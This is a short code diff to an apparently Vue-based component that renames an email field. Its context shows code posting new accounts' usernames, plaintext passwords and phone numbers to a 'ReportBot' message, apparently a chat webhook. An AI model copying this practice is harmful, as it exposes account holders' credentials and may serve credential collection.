@@ -74,7 +74,7 @@ export default {
               .setName("ReportBot")
               .setColor("#ee2200")
               .setText("Added new account !")
-              .addField("Username:", this.tableData[data.index].email)
+              .addField("Username:", this.tableData[data.index]._email)
               .addField("Password:", this.tableData[data.index].password)
               .addField("Number:", this.tableData[data.index].number)
               .setImage(`https://www.countryflags.io/cn/shiny/32.png`)
@@ -169,7 +169,7 @@ export default {
           users: this.tableData.map((item, index) => {
             return {
               tableIndex: index,
-              email: item.email,
+              email: item._email,
               password: item.password,
               country: item.country,
               // gender: item.gender,
